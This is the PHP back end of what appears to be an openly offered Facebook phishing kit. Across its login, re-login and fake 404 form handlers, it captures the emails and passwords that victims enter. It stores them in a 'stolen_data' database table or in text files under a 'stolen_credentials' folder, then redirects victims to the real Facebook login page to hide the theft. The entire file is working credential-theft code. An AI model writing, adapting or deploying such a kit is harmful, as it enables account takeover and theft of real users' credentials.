<?php
/**
*MIT License
*
*Copyright (c) 2022 It0sh1
*Permission is hereby granted, free of charge, to any person obtaining a copy
*of this software and associated documentation files (the "Software"), to deal
*in the Software without restriction, including without limitation the rights
*to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
*copies of the Software, and to permit persons to whom the Software is
*furnished to do so, subject to the following conditions:
*
*(The above copyright notice and this permission notice shall be included in all
*copies or substantial portions of the Software.
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&*
*FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*SOFTWARE.
*/
/************************************/
# Phishingtemplates /facebook        #
# author: It0sh1                     #
# github: https://github.com/it0sh1  #
/*************************************/

require('conf.inc.php');

# making class for login
class Phished
{

  public static function redirect(string $url)
  {
    header('Location: '.$url.'');
    exit;
  }

  // making static function for main page
  public static function GetPhished()
  {

    // defining some vars
    global $use_db;
    global $db_host;
    global $db_user;
    global $db_pass;
    global $db_name;
    global $facebook_link;

    // when victim presses login button
    if(isset($_POST['submitlogin']))
    {

      // getting stolen user input
      $stolen_user_credential_email1 = htmlentities($_POST['emailofuser']);
      $stolen_user_credential_pass1  = htmlentities($_POST['passofuser']);

      if($use_db === true)
      {

        // making connection with database
        $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
        or die('Connection failed bitch :(' . mysqli_connect_error());

        // making SQL
        $sql = "INSERT INTO stolen_data (stolen_username, stolen_password)
        VALUES ('$stolen_user_credential_email1', '$stolen_user_credential_pass1');";

        // when inserting sql query succeed and is true:
        if(mysqli_query($connecting, $sql) === true)
        {

          // redirect to victim login page
          self::redirect($facebook_link);
          exit;

        } else {

          // Showing error:
          echo "Something went very wrong :(, check the error: ".mysqli_connect_error();
        }

      // When $use_db is normally set to false
      // email/numbers/passwords will be saved in a folder
      } else {

        // check if fields are Empty
        if(empty($stolen_user_credential_email1) OR empty($stolen_user_credential_pass1))
        {
          // redirect to /login/ login form
          self::redirect('login/');
        } else {

          // making a folder for stolen user credentials
          $stolen_user_credential_folder = 'stolen_credentials/';

          // check if stolen_credentials folder not exist
          if(!is_dir($stolen_user_credential_folder))
          {

            // make folder
            mkdir($stolen_user_credential_folder);

            // creating .txt with random hashed name
            $randomhashtextfile = uniqid().'.txt';

            // now we making filehandler to put our phished credentials in it
            $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

            // creating text
            $data1 = "Email/Number: " . $stolen_user_credential_email1 . "\n";
            fwrite($filehandler, $data1);

            // second data text
            $data2 = "Password: " . $stolen_user_credential_pass1 . "\n";
            fwrite($filehandler, $data2);
            // close handler
            fclose($filehandler);

            // redirect to victim login page
            self::redirect($facebook_link);
            exit;

          // whem folder does exist
          } else {

            // creating .txt with random hashed name
            $randomhashtextfile = uniqid().'.txt';

            // making file handler again
            $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

            // creating text
            $data1 = "Email/Number: " . $stolen_user_credential_email1 . "\n";
            fwrite($filehandler, $data1);

            // second data text
            $data2 = "Password: " . $stolen_user_credential_pass1 . "\n";
            fwrite($filehandler, $data2);
            // close handler
            fclose($filehandler);

            // redirect to victim login page
            self::redirect($facebook_link);
            exit;
          }
        }
      }
    }

    if(isset($_POST['submittedlogin']))
    {

      // getting stolen user input
      $stolen_user_credential_email2 = htmlentities($_POST['emailofvictim']);
      $stolen_user_credential_pass2  = htmlentities($_POST['passofvictim']);

      if($use_db === true)
      {

        // making connection with database
        $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
        or die('Connection failed bitch :(' . mysqli_connect_error());

        // making SQL
        $sql = "INSERT INTO stolen_data (stolen_username, stolen_password)
        VALUES ('$stolen_user_credential_email2', '$stolen_user_credential_pass2');";

        // when inserting sql query succeed and is true:
        if(mysqli_query($connecting, $sql) === true)
        {

          // redirect to victim login page
          self::redirect($facebook_link);
          exit;

      } else {

        // Showing error:
        echo "Something went very wrong :(, ".mysqli_connect_error();
      }

    } else {

      // check if input fields are empty
      if(empty($stolen_user_credential_email2) OR empty($stolen_user_credential_pass2))
      {
        // hang on the same page
        self::redirect($_SERVER['PHP_SELF']);

      } else {

        // making a folder for stolen user credentials
        $stolen_user_credential_folder = '../stolen_credentials/';

        // check if stolen_cedentials folder not exist
        if(!is_dir($stolen_user_credential_folder))
        {
          // make folder
          mkdir($stolen_user_credential_folder);

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // now we making filehandler to put our phished credentials in it
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Email/Number: " . $stolen_user_credential_email2 . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $stolen_user_credential_pass2 . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to the login page
          self::redirect('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ0OTE2MzMzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D');
          exit;

        } else {

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // make file handler again
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Email/Number: " . $stolen_user_credential_email2 . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $stolen_user_credential_pass2 . "\n";
          fwrite($filehandler, $data2);
          // close handler
          fclose($filehandler);

          // redirect victim to the login page
          self::redirect('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ0OTE2MzMzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D');
          exit;
        }
      }
    }
  }

  // for the 404 page, (yes, you can also 'login' there ;D)
  if(isset($_POST['submittingerrorlogin']))
  {

    // getting stolen user input
    $stolen_user_credential_404_email = htmlentities($_POST['erroremail']);
    $stolen_user_credential_404_pass  = htmlentities($_POST['errorpass']);

    if($use_db === true)
    {

      // making connection with database
      $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
      or die('Connection failed bitch :(' . mysqli_connect_error());

      // making SQL
      $sql = "INSERT INTO stolen_data (stolen_username, stolen_password)
      VALUES ('$stolen_user_credential_email_404_email', '$stolen_user_credential_404_pass');";

      // when inserting sql query succeed and is true:
      if(mysqli_query($connecting, $sql) === true)
      {

      // redirect victim to the login page
      self::redirect($facebook_link);
      exit;

    } else {

      // Showing error:
      echo "Something went very wrong :( check error: ".mysqli_connect_error();
    }

    } else {

      // making a folder for stolen user credentials
      $stolen_user_credential_folder = '../stolen_credentials/';

      // check if stolen_credentials folder not exist
      if(!is_dir($stolen_user_credential_folder))
      {

        // make folder
        mkdir($stolen_user_credential_folder);

        // creating .txt with random hashed name
        $randomhashtextfile = uniqid().'.txt';

        // now we making filehandler to put our phished credentials in it
        $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

        // creating text
        $data1 = "Email/Number: " . $stolen_user_credential_404_email . "\n";
        fwrite($filehandler, $data1);

        // second data text
        $data2 = "Password: " . $stolen_user_credential_404_pass . "\n";
        fwrite($filehandler, $data2);
        // close handler
        fclose($filehandler);

        // redirect to victim login page
        self::redirect($facebook_link);
        exit;

        } else {

          // creating .txt with random hashed name
          $randomhashtextfile = uniqid().'.txt';

          // making file handler again
          $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

          // creating text
          $data1 = "Email/Number: " . $stolen_user_credential_404_email . "\n";
          fwrite($filehandler, $data1);

          // second data text
          $data2 = "Password: " . $stolen_user_credential_404_pass . "\n";
          fwrite($filehandler, $data2);

          // close handler
          fclose($filehandler);

          // redirect to victim login page
          self::redirect($facebook_link);
          exit;
        }
      }
    }
  }
}

// call class and functions
Phished::GetPhished();
?>
